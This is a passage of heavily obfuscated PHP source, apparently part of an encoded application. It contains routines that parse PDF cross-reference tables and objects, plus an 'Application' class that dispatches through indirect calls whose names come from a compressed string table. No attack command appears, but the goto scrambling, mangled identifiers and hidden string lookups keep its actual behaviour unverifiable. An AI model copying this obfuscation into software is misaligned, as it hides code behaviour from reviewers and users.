filesize($a³Î³Çá), $dÇ¯œÒëö¡[1524] => $BòÆÌÃ÷Ù); goto C‚ÁÕï©Üö; E©Ÿ¢²È¯ñ: if ($Dİ°İè¼…¸) { $b•Ø¡ÛŞì‰ = $Dİ°İè¼…¸[$dÇ¯œÒëö¡[1527]][$dÇ¯œÒëö¡[1185]]; $cŸóµó¸© = self::getObjectValue($aËİ¿ç®Ù, $Dİ°İè¼…¸, $b•Ø¡ÛŞì‰); } $cŸóµó¸© = is_array($cŸóµó¸©) ? $cŸóµó¸© : array(); $cŸóµó¸©[$dÇ¯œÒëö¡[1528]] = 0; goto dŠ®¯Çäö‘; FµÌß’¾ª’: preg_match_all($dÌ…ŒÖ¡, $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1525]], $dŸß¤×°ñ½); if ($dŸß¤×°ñ½[1] && $cŸóµó¸©[$dÇ¯œÒëö¡[1532]] < $dŸß¤×°ñ½[1][0]) { $cŸóµó¸©[$dÇ¯œÒëö¡[1532]] = $dŸß¤×°ñ½[1][0]; } preg_match_all($dÌ…ŒÖ¡, $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1526]], $dŸß¤×°ñ½); goto cƒ˜¿µ½°Û; b•ÙÜº‰Å: preg_match($dÌ…ŒÖ¡, $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1526]], $dŸß¤×°ñ½); if (!$cŸóµó¸©[$dÇ¯œÒëö¡[1528]] && count($dŸß¤×°ñ½) == 5) { $cŸóµó¸©[$dÇ¯œÒëö¡[1528]] = $dŸß¤×°ñ½[3]; $cŸóµó¸©[$dÇ¯œÒëö¡[1530]] = $dŸß¤×°ñ½[4]; } preg_match($dÇ¯œÒëö¡[1531], $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1525]], $dŸß¤×°ñ½); goto eÕ‹½†Øá; eÕ‹½†Øá: if ($dŸß¤×°ñ½) { $cŸóµó¸©[$dÇ¯œÒëö¡[1334]] = $dŸß¤×°ñ½[1]; } $cŸóµó¸©[$dÇ¯œÒëö¡[1532]] = 0; $dÌ…ŒÖ¡ = $dÇ¯œÒëö¡[1533]; goto FµÌß’¾ª’; cç“™½È‰Ù: } private static function parseInfoItem($a×Ïğœ‹¶Ü) { $fšßì†¢Å =& $_SERVER[Î¿—”òá]; if (!$a×Ïğœ‹¶Ü) { return !1; } $b¡ğİéÏç© = array($fšßì†¢Å[1335] => array($fšßì†¢Å[1534], $fšßì†¢Å[33]), $fšßì†¢Å[1535] => array($fšßì†¢Å[1536], $fšßì†¢Å[33]), $fšßì†¢Å[187] => array($fšßì†¢Å[1537], $fšßì†¢Å[210]), $fšßì†¢Å[107] => array($fšßì†¢Å[1538], $fšßì†¢Å[210]), $fšßì†¢Å[1532] => array($fšßì†¢Å[1532], $fšßì†¢Å[276]), $fšßì†¢Å[1528] => array($fšßì†¢Å[1528], $fšßì†¢Å[276]), $fšßì†¢Å[1530] => array($fšßì†¢Å[1530], $fšßì†¢Å[276]), $fšßì†¢Å[1539] => array($fšßì†¢Å[1540], $fšßì†¢Å[33]), $fšßì†¢Å[1541] => array($fšßì†¢Å[1542], $fšßì†¢Å[33]), $fšßì†¢Å[1543] => array($fšßì†¢Å[1334], $fšßì†¢Å[33])); $c£´Ÿï†Å = array(); foreach ($b¡ğİéÏç© as $e¸Æµ©èÛÉ => $F—Ìé“‘ñÉ) { if (!isset($a×Ïğœ‹¶Ü[$F—Ìé“‘ñÉ[0]])) { continue; } $BŠ‹ô‡¿æØ = $a×Ïğœ‹¶Ü[$F—Ìé“‘ñÉ[0]]; if (!$BŠ‹ô‡¿æØ || is_array($BŠ‹ô‡¿æØ)) { continue; } switch ($F—Ìé“‘ñÉ[1]) { case $fšßì†¢Å[276]: $BŠ‹ô‡¿æØ = intval($BŠ‹ô‡¿æØ); break; case $fšßì†¢Å[210]: if (substr($BŠ‹ô‡¿æØ, 0, 2) == $fšßì†¢Å[1544]) { $BŠ‹ô‡¿æØ = substr($BŠ‹ô‡¿æØ, 2, 14); } if (strtotime($BŠ‹ô‡¿æØ)) { $BŠ‹ô‡¿æØ = date($fšßì†¢Å[1545], strtotime($BŠ‹ô‡¿æØ)); } break; } $c£´Ÿï†Å[$e¸Æµ©èÛÉ] = $BŠ‹ô‡¿æØ; } return $c£´Ÿï†Å; } private static function decodeXref(&$E‚×¶’Ëî) { goto C–÷óÎ‘‘ê; d¿œ±Šá: if (preg_match($D‘…Ã¾§™ì[1553], $b¢óŸÂŠêÖ, $EäÄˆ¤Ç‡µ) > 0) { $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[77]] = intval($EäÄˆ¤Ç‡µ[1]); } if (preg_match($D‘…Ã¾§™ì[1554], $b¢óŸÂŠêÖ, $EäÄˆ¤Ç‡µ) > 0) { $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[1555]] = intval($EäÄˆ¤Ç‡µ[1]) . $D‘…Ã¾§™ì[70] . intval($EäÄˆ¤Ç‡µ[2]); } if (preg_match($D‘…Ã¾§™ì[1556], $b¢óŸÂŠêÖ, $EäÄˆ¤Ç‡µ) > 0) { $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[1557]] = intval($EäÄˆ¤Ç‡µ[1]) . $D‘…Ã¾§™ì[70] . intval($EäÄˆ¤Ç‡µ[2]); } goto e›¾á±Ôø; eí…ÓİÍÚ: if (preg_match($D‘…Ã¾§™ì[1560], $b¢óŸÂŠêÖ, $EäÄˆ¤Ç‡µ) > 0) { } return $D‡‘ç“¦; goto Bâå‹Äîà÷; dšïğ²®‡Ì: foreach ($EäÄˆ¤Ç‡µ[3] as $DßĞµ¿®» => $Aêµñ­Ùí÷) { if ($EäÄˆ¤Ç‡µ[3][$DßĞµ¿®»] == $D‘…Ã¾§™ì[1549]) { $B¸éå‘È = $c®ª¹›Î§Ï . $D‘…Ã¾§™ì[70] . intval($EäÄˆ¤Ç‡µ[2][$DßĞµ¿®»]); $D‡‘ç“¦[$D‘…Ã¾§™ì[1546]][$B¸éå‘È] = intval($EäÄˆ¤Ç‡µ[1][$DßĞµ¿®»]); ++$c®ª¹›Î§Ï; } else { if ($EäÄˆ¤Ç‡µ[3][$DßĞµ¿®»] == $D‘…Ã¾§™ì[1550]) { ++$c®ª¹›Î§Ï; } else { } } } if (preg_match_all($D‘…Ã¾§™ì[1551], $D£×ƒ†ß¼ğ, $EäÄˆ¤Ç‡µ)) { $fÈâÑÅˆéÅ = $E‚×¶’Ëî[$D‘…Ã¾§™ì[77]] - $E‚×¶’Ëî[$D‘…Ã¾§™ì[1524]]; foreach ($EäÄˆ¤Ç‡µ[0] as $DßĞµ¿®» => $fØĞ”÷Ù´) { $bò“Ä´â§Ÿ = $EäÄˆ¤Ç‡µ[1][$DßĞµ¿®»] . $D‘…Ã¾§™ì[70] . $EäÄˆ¤Ç‡µ[2][$DßĞµ¿®»]; $D‡‘ç“¦[$D‘…Ã¾§™ì[1546]][$bò“Ä´â§Ÿ] = strpos($D£×ƒ†ß¼ğ, $fØĞ”÷Ù´) + $fÈâÑÅˆéÅ + 1; } } if (preg_match_all($D‘…Ã¾§™ì[1552], $D£×ƒ†ß¼ğ, $EäÄˆ¤Ç‡µ)) { $b¢óŸÂŠêÖ = count($EäÄˆ¤Ç‡µ[1]) == 1 ? $EäÄˆ¤Ç‡µ[1][0] : $EäÄˆ¤Ç‡µ[1][1]; } else { $b¢óŸÂŠêÖ = substr($D£×ƒ†ß¼ğ, -1024 * 5); } goto d¿œ±Šá; eÛºÏºâÌë: $aµ©øö—Ã = $D‘…Ã¾§™ì[1547]; if (!preg_match_all($aµ©øö—Ã, $D£×ƒ†ß¼ğ, $EäÄˆ¤Ç‡µ, PREG_SET_ORDER, 0)) { return !1; } $C÷Î–¬ê¹í = intval($EäÄˆ¤Ç‡µ[0][1]); goto C©£â¥É¤ø; C–÷óÎ‘‘ê: $D‘…Ã¾§™ì =& $_SERVER[Î¿—”òá]; $D£×ƒ†ß¼ğ = $E‚×¶’Ëî[$D‘…Ã¾§™ì[1526]]; $D‡‘ç“¦ = array($D‘…Ã¾§™ì[1527] => array(), $D‘…Ã¾§™ì[1546] => array()); goto eÛºÏºâÌë; e›¾á±Ôø: if (preg_match($D‘…Ã¾§™ì[1558], $b¢óŸÂŠêÖ, $EäÄˆ¤Ç‡µ) > 0) { $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[1185]] = intval($EäÄˆ¤Ç‡µ[1]) . $D‘…Ã¾§™ì[70] . intval($EäÄˆ¤Ç‡µ[2]); } if (preg_match($D‘…Ã¾§™ì[1559], $b¢óŸÂŠêÖ, $EäÄˆ¤Ç‡µ) > 0) { $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[367]] = array(); $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[367]][0] = $EäÄˆ¤Ç‡µ[1]; $D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[367]][1] = $EäÄˆ¤Ç‡µ[2]; } if (!$D‡‘ç“¦[$D‘…Ã¾§™ì[1527]][$D‘…Ã¾§™ì[1185]]) { return !1; } goto eí…ÓİÍÚ; C©£â¥É¤ø: if ($E‚×¶’Ëî[$D‘…Ã¾§™ì[77]] - $C÷Î–¬ê¹í > $E‚×¶’Ëî[$D‘…Ã¾§™ì[1524]]) { $DãØßÉ˜Œ = 4 * $E‚×¶’Ëî[$D‘…Ã¾§™ì[1524]]; $E‚×¶’Ëî[$D‘…Ã¾§™ì[1524]] = $DãØßÉ˜Œ; $E‚×¶’Ëî[$D‘…Ã¾§™ì[1525]] = StreamWrapperIO::read($E‚×¶’Ëî[$D‘…Ã¾§™ì[75]], 0, $DãØßÉ˜Œ); $E‚×¶’Ëî[$D‘…Ã¾§™ì[1526]] = StreamWrapperIO::read($E‚×¶’Ëî[$D‘…Ã¾§™ì[75]], $E‚×¶’Ëî[$D‘…Ã¾§™ì[77]] - $DãØßÉ˜Œ, $DãØßÉ˜Œ); $D£×ƒ†ß¼ğ = $E‚×¶’Ëî[$D‘…Ã¾§™ì[1526]]; } $c®ª¹›Î§Ï = 0; preg_match_all($D‘…Ã¾§™ì[1548], $D£×ƒ†ß¼ğ, $EäÄˆ¤Ç‡µ); goto dšïğ²®‡Ì; Bâå‹Äîà÷: } private static function getObjectValue($bÛàí¡ˆÄä, $cÈå¤ïİ, $B„öÅİŸ‘™) { goto eæĞï¨ê’Ë; e‡³‰Ø†İ: return $BÒ‰°½‘å; goto c‰´ßĞÉÁ; eæĞï¨ê’Ë: $F›Ø”´ó‘£ =& $_SERVER[Î¿—”òá]; $F˜Æ¼É÷¥« = self::getObject($bÛàí¡ˆÄä, $cÈå¤ïİ[$F›Ø”´ó‘£[1546]][$B„öÅİŸ‘™]); if (is_string($F˜Æ¼É÷¥«[1])) { return $F˜Æ¼É÷¥«[1]; } goto eÑ“¿àÍË; eÑ“¿àÍË: if (!is_array($F˜Æ¼É÷¥«[1])) { return array(); } $BÒ‰°½‘å = array(); for ($c§÷Â…Êì = 0; $c§÷Â…Êì < count($F˜Æ¼É÷¥«[1]); $c§÷Â…Êì += 2) { $bãƒÚ… = $F˜Æ¼É÷¥«[1][$c§÷Â…Êì]; $CŞç¬º® = $F˜Æ¼É÷¥«[1][$c§÷Â…Êì + 1]; if (count($bãƒÚ…) == 3 && $bãƒÚ…[0] == $F›Ø”´ó‘£[8]) { $BÊ—ï—Šª = !1; if ($CŞç¬º®[0] == $F›Ø”´ó‘£[1561]) { $CŞç¬º® = self::getObject($bÛàí¡ˆÄä, $cÈå¤ïİ[$F›Ø”´ó‘£[1546]][$CŞç¬º®[1]]); } $BÊ—ï—Šª = $CŞç¬º®[1]; if ($BÊ—ï—Šª === !1) { continue; } if (is_string($BÊ—ï—Šª)) { $BÊ—ï—Šª = self::decodeStr($BÊ—ï—Šª); } $BÒ‰°½‘å[$bãƒÚ…[1]] = $BÊ—ï—Šª; } } goto e‡³‰Ø†İ; c‰´ßĞÉÁ: } private static function getObject($a­÷óÕº², $f»ŠëªÇ±) { $d˜Üƒì¤´Ğ = self::getObjectItem($a­÷óÕº², $f»ŠëªÇ±); $d˜Üƒì¤´Ğ = self::getObjectItem($a­÷óÕº², $d˜Üƒì¤´Ğ[2]); return $d˜Üƒì¤´Ğ; } private static function getObjectItem($aàËçì³—, $B ¡èº¯­Ë) { goto dËîªˆµæ…; A‚ŸÛ¨Ÿ: $dÛ½ĞğŸ¡· = self::getRawObject($fÏŞ¿ùä™Ï, $BŒæ‘Œ³œ); if ($B ¡èº¯­Ë >= $B¶™ƒËæß…) { $dÛ½ĞğŸ¡·[2] = $dÛ½ĞğŸ¡·[2] + $B¶™ƒËæß…; } else { if ($B ¡èº¯­Ë > $fÖ—¼¢É´ && $B ¡èº¯­Ë <= $B¶™ƒËæß…) { $dÛ½ĞğŸ¡·[2] = $dÛ½ĞğŸ¡·[2] + $B ¡èº¯­Ë; } } return $dÛ½ĞğŸ¡·; goto A˜‚Û÷÷˜ë; c÷½”¼éÏ: $BŒæ‘Œ³œ = $B ¡èº¯­Ë >= $B¶™ƒËæß… ? $B ¡èº¯­Ë - $B¶™ƒËæß… : $B ¡èº¯­Ë; $fÏŞ¿ùä™Ï = $B ¡èº¯­Ë >= $B¶™ƒËæß… ? $aàËçì³—[$C»¾†Î„‰[1526]] : $aàËçì³—[$C»¾†Î„‰[1525]]; if ($B ¡èº¯­Ë > $fÖ—¼¢É´ && $B ¡èº¯­Ë <= $B¶™ƒËæß…) { $BŒæ‘Œ³œ = 0; $fÏŞ¿ùä™Ï = StreamWrapperIO::read($aàËçì³—[$C»¾†Î„‰[75]], $B ¡èº¯­Ë, $fÖ—¼¢É´); } goto A‚ŸÛ¨Ÿ; dËîªˆµæ…: $C»¾†Î„‰ =& $_SERVER[Î¿—”òá]; $fÖ—¼¢É´ = $aàËçì³—[$C»¾†Î„‰[1524]]; $B¶™ƒËæß… = $aàËçì³—[$C»¾†Î„‰[77]] - $fÖ—¼¢É´; goto c÷½”¼éÏ; A˜‚Û÷÷˜ë: } private static function decodeStr($F”ÓÏÌù¬¤) { goto aÁäŒÔªŠ¾; c¬ÄÔÕ–³: return $F”ÓÏÌù¬¤; goto dØõâ‚Œ«À; f‚èÂ¿ñ‹…: $F”ÓÏÌù¬¤ = $BÏ½ÏÜ¸²ğ[33]; foreach ($A´³áº‡¹š as $D—ŒŒ‚İ‡Ø) { if (preg_match($BÏ½ÏÜ¸²ğ[1573], $D—ŒŒ‚İ‡Ø)) { $F”ÓÏÌù¬¤ .= \chr(hexdec(trim($D—ŒŒ‚İ‡Ø, $BÏ½ÏÜ¸²ğ[1574]))); } else { $F”ÓÏÌù¬¤ .= $D—ŒŒ‚İ‡Ø; } } $A´³áº‡¹š = preg_split($BÏ½ÏÜ¸²ğ[1575], $F”ÓÏÌù¬¤, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CÑØ›…‘ù†; aÁäŒÔªŠ¾: $BÏ½ÏÜ¸²ğ =& $_SERVER[Î¿—”òá]; $F”ÓÏÌù¬¤ = str_replace(array($BÏ½ÏÜ¸²ğ[1562], $BÏ½ÏÜ¸²ğ[1563], $BÏ½ÏÜ¸²ğ[1564], $BÏ½ÏÜ¸²ğ[1565], $BÏ½ÏÜ¸²ğ[1566], $BÏ½ÏÜ¸²ğ[1567], $BÏ½ÏÜ¸²ğ[1568], $BÏ½ÏÜ¸²ğ[1569]), array($BÏ½ÏÜ¸²ğ[93], $BÏ½ÏÜ¸²ğ[50], $BÏ½ÏÜ¸²ğ[8], $BÏ½ÏÜ¸²ğ[248], $BÏ½ÏÜ¸²ğ[810], $BÏ½ÏÜ¸²ğ[217], $BÏ½ÏÜ¸²ğ[985], $BÏ½ÏÜ¸²ğ[330]), $F”ÓÏÌù¬¤); $A´³áº‡¹š = preg_split($BÏ½ÏÜ¸²ğ[1570], $F”ÓÏÌù¬¤, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CƒÆŒè¬Šì; CÑØ›…‘ù†: $F”ÓÏÌù¬¤ = $BÏ½ÏÜ¸²ğ[33]; foreach ($A´³áº‡¹š as $D—ŒŒ‚İ‡Ø) { if (preg_match($BÏ½ÏÜ¸²ğ[1576], $D—ŒŒ‚İ‡Ø) && !1 === stripos($D—ŒŒ‚İ‡Ø, $BÏ½ÏÜ¸²ğ[1577])) { $D—ŒŒ‚İ‡Ø = preg_replace($BÏ½ÏÜ¸²ğ[1578], $BÏ½ÏÜ¸²ğ[33], $D—ŒŒ‚İ‡Ø); $D—ŒŒ‚İ‡Ø = trim($D—ŒŒ‚İ‡Ø, $BÏ½ÏÜ¸²ğ[919]); $D—ŒŒ‚İ‡Ø = pack($BÏ½ÏÜ¸²ğ[1579], $D—ŒŒ‚İ‡Ø); $F”ÓÏÌù¬¤ .= $D—ŒŒ‚İ‡Ø; } else { $F”ÓÏÌù¬¤ .= $D—ŒŒ‚İ‡Ø; } } if (preg_match($BÏ½ÏÜ¸²ğ[1580], $F”ÓÏÌù¬¤)) { $fà½Œ‘«­Û = substr($F”ÓÏÌù¬¤, 2); $F”ÓÏÌù¬¤ = $BÏ½ÏÜ¸²ğ[33]; $aÁåİÉ”¥¦ = strlen($fà½Œ‘«­Û); for ($eÜ†¢Èø®… = 0; $eÜ†¢Èø®… < $aÁåİÉ”¥¦; $eÜ†¢Èø®… += 2) { $Fœº¯ºĞÁ = hexdec(bin2hex(substr($fà½Œ‘«­Û, $eÜ†¢Èø®…, 2))); $F”ÓÏÌù¬¤ .= mb_convert_encoding($BÏ½ÏÜ¸²ğ[1581] . intval($Fœº¯ºĞÁ) . $BÏ½ÏÜ¸²ğ[67], $BÏ½ÏÜ¸²ğ[1582], $BÏ½ÏÜ¸²ğ[1583]); } } goto c¬ÄÔÕ–³; CƒÆŒè¬Šì: $F”ÓÏÌù¬¤ = $BÏ½ÏÜ¸²ğ[33]; foreach ($A´³áº‡¹š as $D—ŒŒ‚İ‡Ø) { if (preg_match($BÏ½ÏÜ¸²ğ[1571], $D—ŒŒ‚İ‡Ø)) { $F”ÓÏÌù¬¤ .= \chr(octdec(trim($D—ŒŒ‚İ‡Ø, $BÏ½ÏÜ¸²ğ[93]))); } else { $F”ÓÏÌù¬¤ .= $D—ŒŒ‚İ‡Ø; } } $A´³áº‡¹š = preg_split($BÏ½ÏÜ¸²ğ[1572], $F”ÓÏÌù¬¤, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f‚èÂ¿ñ‹…; dØõâ‚Œ«À: } private static function getRawObject($FïÔÀˆ„ÉŒ, $cÈéÔÜ = 0) { goto Bôç²… ïÃ; EóÔğàÊ: return array($F£İÇ¤„Ğš, $bæ½Äòïò, $cÈéÔÜ); goto a™‘ƒ™¹®ç; Bôç²… ïÃ: $a½Œ„õò×´ =& $_SERVER[Î¿—”òá]; $F£İÇ¤„Ğš = $a½Œ„õò×´[33]; $bæ½Äòïò = $a½Œ„õò×´[33]; goto CÅ£«ÑšÁ; CÅ£«ÑšÁ: $cÈéÔÜ += strspn($FïÔÀˆ„ÉŒ, $a½Œ„õò×´[1584], $cÈéÔÜ); $b°àà÷×î‰ = $FïÔÀˆ„ÉŒ[$cÈéÔÜ]; switch ($b°àà÷×î‰) { case $a½Œ„õò×´[1585]: $aÜ§µÜçÁ« = strcspn($FïÔÀˆ„ÉŒ, $a½Œ„õò×´[1586], $cÈéÔÜ); if ($aÜ§µÜçÁ« > 0) { $cÈéÔÜ += $aÜ§µÜçÁ«; return self::getRawObject($FïÔÀˆ„ÉŒ, $cÈéÔÜ); } break; case $a½Œ„õò×´[8]: $F£İÇ¤„Ğš = $b°àà÷×î‰; ++$cÈéÔÜ; $Aé‡ì‰ãõ¤ = preg_match($a½Œ„õò×´[1587], substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 256), $DƒßîæÖÛÀ); if (1 == $Aé‡ì‰ãõ¤) { $bæ½Äòïò = $DƒßîæÖÛÀ[1]; $cÈéÔÜ += strlen($bæ½Äòïò); } break; case $a½Œ„õò×´[248]: case $a½Œ„õò×´[810]: $F£İÇ¤„Ğš = $b°àà÷×î‰; ++$cÈéÔÜ; $F‡›Š‘™™Ù = $cÈéÔÜ; if ($a½Œ„õò×´[248] == $b°àà÷×î‰) { $f—Ï¡³Í×Ş = 1; while ($f—Ï¡³Í×Ş > 0) { if (!isset($FïÔÀˆ„ÉŒ[$F‡›Š‘™™Ù])) { break; } $eªÈùöá¾± = $FïÔÀˆ„ÉŒ[$F‡›Š‘™™Ù]; switch ($eªÈùöá¾±) { case $a½Œ„õò×´[93]: ++$F‡›Š‘™™Ù; break; case $a½Œ„õò×´[248]: ++$f—Ï¡³Í×Ş; break; case $a½Œ„õò×´[810]: --$f—Ï¡³Í×Ş; break; } ++$F‡›Š‘™™Ù; } $bæ½Äòïò = substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, $F‡›Š‘™™Ù - $cÈéÔÜ - 1); $cÈéÔÜ = $F‡›Š‘™™Ù; } break; case $a½Œ„õò×´[157]: case $a½Œ„õò×´[476]: $F£İÇ¤„Ğš = $b°àà÷×î‰; ++$cÈéÔÜ; if ($a½Œ„õò×´[157] == $b°àà÷×î‰) { $bæ½Äòïò = array(); do { $dº„²´ÍêÍ = $cÈéÔÜ; $bó×¶íª¨é = self::getRawObject($FïÔÀˆ„ÉŒ, $cÈéÔÜ); $cÈéÔÜ = $bó×¶íª¨é[2]; $bæ½Äòïò[] = $bó×¶íª¨é; } while ($a½Œ„õò×´[476] != $bó×¶íª¨é[0] && $cÈéÔÜ != $dº„²´ÍêÍ); array_pop($bæ½Äòïò); } break; case $a½Œ„õò×´[918]: case $a½Œ„õò×´[921]: if (isset($FïÔÀˆ„ÉŒ[$cÈéÔÜ + 1]) && $FïÔÀˆ„ÉŒ[$cÈéÔÜ + 1] == $b°àà÷×î‰) { $F£İÇ¤„Ğš = $b°àà÷×î‰ . $b°àà÷×î‰; $cÈéÔÜ += 2; if ($a½Œ„õò×´[918] == $b°àà÷×î‰) { $bæ½Äòïò = array(); do { $dº„²´ÍêÍ = $cÈéÔÜ; $bó×¶íª¨é = self::getRawObject($FïÔÀˆ„ÉŒ, $cÈéÔÜ); $cÈéÔÜ = $bó×¶íª¨é[2]; $bæ½Äòïò[] = $bó×¶íª¨é; } while ($a½Œ„õò×´[1588] != $bó×¶íª¨é[0] && $cÈéÔÜ != $dº„²´ÍêÍ); array_pop($bæ½Äòïò); } } else { $F£İÇ¤„Ğš = $b°àà÷×î‰; ++$cÈéÔÜ; $Aé‡ì‰ãõ¤ = preg_match($a½Œ„õò×´[1589], substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ), $DƒßîæÖÛÀ); if ($a½Œ„õò×´[918] == $b°àà÷×î‰ && 1 == $Aé‡ì‰ãõ¤) { $bæ½Äòïò = strtr($DƒßîæÖÛÀ[1], $a½Œ„õò×´[1590], $a½Œ„õò×´[33]); $cÈéÔÜ += \strlen($DƒßîæÖÛÀ[0]); } elseif (!1 !== ($Eˆò—¥§á¢ = strpos($FïÔÀˆ„ÉŒ, $a½Œ„õò×´[921], $cÈéÔÜ))) { $cÈéÔÜ = $Eˆò—¥§á¢ + 1; } } break; default: if ($a½Œ„õò×´[1591] == substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 6)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1591]; $cÈéÔÜ += 6; } elseif ($a½Œ„õò×´[99] == substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 4)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[99]; $cÈéÔÜ += 4; $bæ½Äòïò = $a½Œ„õò×´[99]; } elseif ($a½Œ„õò×´[1592] == substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 4)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1593]; $cÈéÔÜ += 4; $bæ½Äòïò = $a½Œ„õò×´[1592]; } elseif ($a½Œ„õò×´[1594] == substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 5)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1593]; $cÈéÔÜ += 5; $bæ½Äòïò = $a½Œ„õò×´[1594]; } elseif ($a½Œ„õò×´[1595] == substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 6)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1595]; $cÈéÔÜ += 6; if (1 == preg_match($a½Œ„õò×´[1596], substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ), $DƒßîæÖÛÀ)) { $cÈéÔÜ += strlen($DƒßîæÖÛÀ[0]); $dİáŠåÒÃÖ = $a½Œ„õò×´[1597]; $Aé‡ì‰ãõ¤ = preg_match($dİáŠåÒÃÖ, substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ), $DƒßîæÖÛÀ, PREG_OFFSET_CAPTURE); if (1 == $Aé‡ì‰ãõ¤) { $bæ½Äòïò = substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, $DƒßîæÖÛÀ[0][1]); $cÈéÔÜ += $DƒßîæÖÛÀ[1][1]; } } } elseif ($a½Œ„õò×´[1598] == substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 9)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1598]; $cÈéÔÜ += 9; } elseif (1 == preg_match($a½Œ„õò×´[1599], substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 33), $DƒßîæÖÛÀ)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1561]; $cÈéÔÜ += strlen($DƒßîæÖÛÀ[0]); $bæ½Äòïò = intval($DƒßîæÖÛÀ[1]) . $a½Œ„õò×´[70] . intval($DƒßîæÖÛÀ[2]); } elseif (1 == preg_match($a½Œ„õò×´[1600], substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, 33), $DƒßîæÖÛÀ)) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1601]; $bæ½Äòïò = intval($DƒßîæÖÛÀ[1]) . $a½Œ„õò×´[70] . intval($DƒßîæÖÛÀ[2]); $cÈéÔÜ += strlen($DƒßîæÖÛÀ[0]); } elseif (($Bá¼ô‘Êó‰ = strspn($FïÔÀˆ„ÉŒ, $a½Œ„õò×´[1602], $cÈéÔÜ)) > 0) { $F£İÇ¤„Ğš = $a½Œ„õò×´[1603]; $bæ½Äòïò = substr($FïÔÀˆ„ÉŒ, $cÈéÔÜ, $Bá¼ô‘Êó‰); $cÈéÔÜ += $Bá¼ô‘Êó‰; } break; } goto EóÔğàÊ; a™‘ƒ™¹®ç: } } goto f Ù©íÚ; aŠñ·çåÙ: $c‘Åß°é‰© = $_SERVER[Î¿—”òá][547]; while (strlen($c‘Åß°é‰©) < $_SERVER[Î¿—”òá][548]) { if (!$c‘Åß°é‰©) { break; } $c‘Åß°é‰©++; } $_SERVER[Ñ¯] = explode($_SERVER[Î¿—”òá][549], gzinflate(substr($_SERVER[Î¿—”òá][550], 10, -8))); goto CÂáª«öŞÒ; CÂáª«öŞÒ: $BÔÙËÙ´¾ = $_SERVER[Î¿—”òá][551]; if (!$BÔÙËÙ´¾) { die; } class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($eßé…ÑøÅ) { goto d¹Ã–øÔ“è; Då‚º·ñ°¸: $Cè‹£ïß  = $dÃ’ššš¿ç[552]; if (!$Cè‹£ïß ) { die; } $this->defaultModule = $EÙ«¹ÀäÚó[0] ? $EÙ«¹ÀäÚó[0] : $this->defaultModule; goto BÆ´ªÈˆé¨; dáíòÎ–: $Aë†¿’ƒ­ = $dÃ’ššš¿ç[555]; while ($Aë†¿’ƒ­ < $dÃ’ššš¿ç[556]) { if ($Aë†¿’ƒ­ >= 0) { break; } $Aë†¿’ƒ­++; } goto fô†¥½öÏ°; BÆ´ªÈˆé¨: $this->defaultController = $EÙ«¹ÀäÚó[1] ? $EÙ«¹ÀäÚó[1] : $this->defaultController; $F¬™¬†¸ = $dÃ’ššš¿ç[553]; $this->defaultAction = $EÙ«¹ÀäÚó[2] ? $EÙ«¹ÀäÚó[2] : $this->defaultAction; goto fšÂ·§àåä; d¹Ã–øÔ“è: $dÃ’ššš¿ç =& $_SERVER[Î¿—”òá]; $EŸ‘ØÌíºé =& $_SERVER[Ñ¯]; $EÙ«¹ÀäÚó = $EŸ‘ØÌíºé[0]($EŸ‘ØÌíºé[1], $EŸ‘ØÌíºé[2]($eßé…ÑøÅ, $EŸ‘ØÌíºé[1])); goto Då‚º·ñ°¸; fšÂ·§àåä: $B´®ƒÈ³ÏÆ = $dÃ’ššš¿ç[554]; if (!$B´®ƒÈ³ÏÆ) { return; } $this->{$_SERVER[Ñ¯][3]}($EŸ‘ØÌíºé[4], array($this, $EŸ‘ØÌíºé[5])); goto dáíòÎ–; fô†¥½öÏ°: } public function appRun($e‡«©ºÍ•) { goto dŠ¾ø¯å«; DØá­Æ¡…î: $ašƒªŠ®˜¬ = $dª„…’¿©[557]; if (!$ašƒªŠ®˜¬) { return; } $f•¾¢¯†Ì… = $c››´“ØŞ¥[6]($dÓ‹ÓÊÛÂ[0]); goto bÖªƒ°‹®¾; bÖªƒ°‹®¾: $e¬°Üì¸¡È = $dª„…’¿©[558]; if (!$e¬°Üì¸¡È) { die; } $C¤Î©Ÿ­ Â = $c››´“ØŞ¥[7]; goto CÈ´ºÃ Ÿ; dŠ¾ø¯å«: $dª„…’¿© =& 